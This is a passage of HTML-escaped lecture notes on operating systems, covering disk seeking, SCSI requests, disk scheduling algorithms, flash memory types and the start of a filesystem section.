        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Move head to specific track
&lt;ul&gt;
&lt;li&gt;Keep it there by resisting physical shocks, imperfect tracks, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Seeking
&lt;ol&gt;
&lt;li&gt;speedup - accelerate arm to max speed or hafl way point&lt;/li&gt;
&lt;li&gt;coast - at max speed (for long seeks)&lt;/li&gt;
&lt;li&gt;slowdown - stops arm near destination&lt;/li&gt;
&lt;li&gt;settle - adjusts head to actual desired track&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Settle dominates very short seeks (~1ms)&lt;/li&gt;
&lt;li&gt;Short seeks dominated by speedup (acceleration of 40Gs)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;seeking&#34; &gt;Seeking
&lt;span&gt;
    &lt;a href=&#34;#seeking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Head adjustments&lt;/li&gt;
&lt;li&gt;Settles take longer for writes because a checksum can be used to retry a read, but a write needs to be perfect otherwise another track got written to&lt;/li&gt;
&lt;li&gt;Disk keeps table of pivot motor power
&lt;ul&gt;
&lt;li&gt;Maps seek distance to power and time&lt;/li&gt;
&lt;li&gt;Table set by periodic “thermal recalibration”
&lt;ul&gt;
&lt;li&gt;Recalibration hurts audio-video&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Average seek time can be anything from seeking a third of the disk to a third of the time required to seek entire disk&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;sectors&#34; &gt;Sectors
&lt;span&gt;
    &lt;a href=&#34;#sectors&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Disk interface presents linear array of sectors&lt;/li&gt;
&lt;li&gt;512 bytes written atomically&lt;/li&gt;
&lt;li&gt;Disk handles mapping logical sector number to physical sector
&lt;ul&gt;
&lt;li&gt;Zoning: puts more sectors on longer tracks&lt;/li&gt;
&lt;li&gt;Track skewing: sector 0 pos. varies by track to speed up sequential access across tracks&lt;/li&gt;
&lt;li&gt;Sparing: flawed sectors remapped elsewhere&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;OS assumes disk is blackbox
&lt;ul&gt;
&lt;li&gt;Larger logical sector # difference = larger seek&lt;/li&gt;
&lt;li&gt;Can build table to estimate times through emperical tests&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;disk-interface&#34; &gt;Disk Interface
&lt;span&gt;
    &lt;a href=&#34;#disk-interface&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Controls hardware, mediates access&lt;/li&gt;
&lt;li&gt;Connected to computer by bus that can be contended by multiple devices&lt;/li&gt;
&lt;li&gt;Command queueing&lt;/li&gt;
&lt;li&gt;Disk cache for read-ahead&lt;/li&gt;
&lt;li&gt;Write caching is possible but unstable data&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;buses&#34; &gt;Buses
&lt;span&gt;
    &lt;a href=&#34;#buses&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;SCSI
&lt;ul&gt;
&lt;li&gt;Devices: host adapters &amp;amp; SCSI (bus) controllers&lt;/li&gt;
&lt;li&gt;Service Delivery Subsystem connects devices (SCSI bus)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;SCSI-2 bus (SDS) connects up to 8 devices
&lt;ul&gt;
&lt;li&gt;Controllers can have &amp;gt; 1 logical units (LUNs)&lt;/li&gt;
&lt;li&gt;Controller built into disk&lt;/li&gt;
&lt;li&gt;Bridge controller can manage multiple devices&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Device is either initiator or target
&lt;ul&gt;
&lt;li&gt;Traditionally host adapter was initiator, controller the target&lt;/li&gt;
&lt;li&gt;Controllers can be initiators&lt;/li&gt;
&lt;li&gt;1 initiaor and at least one target&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;scsi-requests&#34; &gt;SCSI Requests
&lt;span&gt;
    &lt;a href=&#34;#scsi-requests&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;A request is a command from initiator to target&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Commmand
&lt;ul&gt;
&lt;li&gt;Target gets control of bus but can disconnect and then reconnect&lt;/li&gt;
&lt;li&gt;Task identifier: initiator ID, target ID, LUN, tag&lt;/li&gt;
&lt;li&gt;Command descriptor block: read 10 blocks at pos. N&lt;/li&gt;
&lt;li&gt;Task attribute: simple ordered, head of queue&lt;/li&gt;
&lt;li&gt;Optional: output/input buffer, sense data&lt;/li&gt;
&lt;li&gt;Status byte: good, check condition, intermediate&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Execution
&lt;ul&gt;
&lt;li&gt;Each Logical unit maintains a queue of tasks { dormant, blocked, enabled, ended }&lt;/li&gt;
&lt;li&gt;Simple tasks are dormant until no ordered/head of queue&lt;/li&gt;
&lt;li&gt;Ordered tasks dormant until no HoQ/more recent ordered&lt;/li&gt;
&lt;li&gt;HoQ tasks begin in enabled state&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Initatior can manage tasks
&lt;ul&gt;
&lt;li&gt;Abort/terminate, reset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Linked commands
&lt;ul&gt;
&lt;li&gt;Atomic read-modify-write implementation&lt;/li&gt;
&lt;li&gt;Intermediate commands return a status of intermediate&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;scsi-exceptions&#34; &gt;SCSI Exceptions
&lt;span&gt;
    &lt;a href=&#34;#scsi-exceptions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Stop executing most commands&lt;/li&gt;
&lt;li&gt;Return &amp;ldquo;check conditon&amp;rdquo; status&lt;/li&gt;
&lt;li&gt;Simple device implementation&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;disk-performance&#34; &gt;Disk Performance
&lt;span&gt;
    &lt;a href=&#34;#disk-performance&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Ordering is huge issue&lt;/li&gt;
&lt;li&gt;Sequential much faster than random&lt;/li&gt;
&lt;li&gt;Power fail leads to inconsistent state&lt;/li&gt;
&lt;li&gt;Order for crashes&lt;/li&gt;
&lt;li&gt;Order requests to minimize seek times&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;disk-scheduling&#34; &gt;Disk Scheduling
&lt;span&gt;
    &lt;a href=&#34;#disk-scheduling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;h4 id=&#34;first-come-first-serve-fcfs&#34; &gt;First Come First Serve (FCFS)
&lt;span&gt;
    &lt;a href=&#34;#first-come-first-serve-fcfs&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Process disk requests as they come in&lt;/li&gt;
&lt;li&gt;Increases average latency&lt;/li&gt;
&lt;li&gt;Cannot exploit request locality&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;shortest-positioning-time-first-sptf&#34; &gt;Shortest Positioning Time First (SPTF)
&lt;span&gt;
    &lt;a href=&#34;#shortest-positioning-time-first-sptf&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Pick requests with shortest seek time&lt;/li&gt;
&lt;li&gt;higher throughput and exploits locality&lt;/li&gt;
&lt;li&gt;starvation (longer seeks never get a chance)&lt;/li&gt;
&lt;li&gt;don&amp;rsquo;t know which request will be fastest&lt;/li&gt;
&lt;li&gt;Improve with aged SPTF
&lt;ul&gt;
&lt;li&gt;Serve lowest priorities, adjust by wait time&lt;/li&gt;
&lt;li&gt;T&lt;sub&gt;effective&lt;/sub&gt;=  T&lt;sub&gt;pos&lt;/sub&gt; - W * T&lt;sub&gt;wait&lt;/sub&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;elevator-scheduling-scan&#34; &gt;Elevator Scheduling (SCAN)
&lt;span&gt;
    &lt;a href=&#34;#elevator-scheduling-scan&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Sweep across disk, servicing all requests passed&lt;/li&gt;
&lt;li&gt;Seeks must be in the same direction&lt;/li&gt;
&lt;li&gt;Switch directions if no further requests&lt;/li&gt;
&lt;li&gt;Bounded waiting&lt;/li&gt;
&lt;li&gt;Biased towards middle cylinders&lt;/li&gt;
&lt;li&gt;Could miss an optimization SPTF would catch&lt;/li&gt;
&lt;li&gt;CSCAN: only sweep in one direction (common in Unix)
&lt;ul&gt;
&lt;li&gt;LOOK/CLOOK in textbook&lt;/li&gt;
&lt;li&gt;After reaching disk end, jump to start of disk&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;vscanr&#34; &gt;VSCAN(r)
&lt;span&gt;
    &lt;a href=&#34;#vscanr&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;SPTF and SCAN&lt;/li&gt;
&lt;li&gt;T&lt;sub&gt;effective&lt;/sub&gt; = T&lt;sub&gt;pos&lt;/sub&gt; + r * T&lt;sub&gt;max&lt;/sub&gt;&lt;/li&gt;
&lt;li&gt;0 &amp;lt;= r &amp;lt;= 1&lt;/li&gt;
&lt;li&gt;r determines how much same direction seeking is rewarded (0 = SPTF, 1 = SCAN)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;flash-memory&#34; &gt;Flash Memory
&lt;span&gt;
    &lt;a href=&#34;#flash-memory&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Solid state&lt;/li&gt;
&lt;li&gt;Stores charge
&lt;ul&gt;
&lt;li&gt;Charge wears off (Phone off for a year will cause data loss)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Better heat and power consumption&lt;/li&gt;
&lt;li&gt;Limited overwrites&lt;/li&gt;
&lt;li&gt;Flash Translation Layer to protect physical block = performance impact&lt;/li&gt;
&lt;li&gt;Random write are expensive&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;nor-flash&#34; &gt;NOR flash
&lt;span&gt;
    &lt;a href=&#34;#nor-flash&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Can execute code in flash itself&lt;/li&gt;
&lt;li&gt;Faster smaller unit reads&lt;/li&gt;
&lt;li&gt;Slower erases&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;single-level-cell-slc-vs-multi-level-cell-mlc&#34; &gt;Single-level cell (SLC) vs. Multi-level cell (MLC)
&lt;span&gt;
    &lt;a href=&#34;#single-level-cell-slc-vs-multi-level-cell-mlc&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;MLC encodes multiple bits in voltage level&lt;/li&gt;
&lt;li&gt;MLC slower to write than SLC&lt;/li&gt;
&lt;li&gt;MLC is basically more dense at write latency cost&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;nand-flash&#34; &gt;NAND flash
&lt;span&gt;
    &lt;a href=&#34;#nand-flash&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Higher density&lt;/li&gt;
&lt;li&gt;Faster erase/write&lt;/li&gt;
&lt;li&gt;More errors needing error correction&lt;/li&gt;
&lt;li&gt;2112-byte pages&lt;/li&gt;
&lt;li&gt;Blocks contain 64 (SLC) or 128 (MLC) pages&lt;/li&gt;
&lt;li&gt;Blocks divided into 2-4 planes
&lt;ul&gt;
&lt;li&gt;All planes contend for same package pins&lt;/li&gt;
&lt;li&gt;Block access in parallel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Limited to reading one page at at ime
&lt;ul&gt;
&lt;li&gt;25 micro seconds&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Must erase whole block before programming
&lt;ul&gt;
&lt;li&gt;2ms&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;filesystem&#34; &gt;Filesystem
&lt;span&gt;
    &lt;a href=&#34;#filesystem&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;files-name-bytes-on-disk&#34; &gt;Files: name bytes on disk
&lt;span&gt;
    &lt;a href=&#34;#files-name-bytes-on-disk&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;File system: translate name &amp;amp; offset to disk blocks&lt;/li&gt;
&lt;li&gt;Want to reduce number of disk accesses for operations (group related things)&lt;/li&gt;
&lt;li&gt;File system  metadata
&lt;ul&gt;
&lt;li&gt;An inonde that points to the inode array.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mappings&#34; &gt;Mappings
&lt;span&gt;
    &lt;a href=&#34;#mappings&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;File metadata (inode): map byte offset to disk block address&lt;/li&gt;
&lt;li&gt;Directory: map name to disk address or file #&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;intuitions&#34; &gt;Intuitions
&lt;span&gt;
    &lt;a href=&#34;#intuitions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
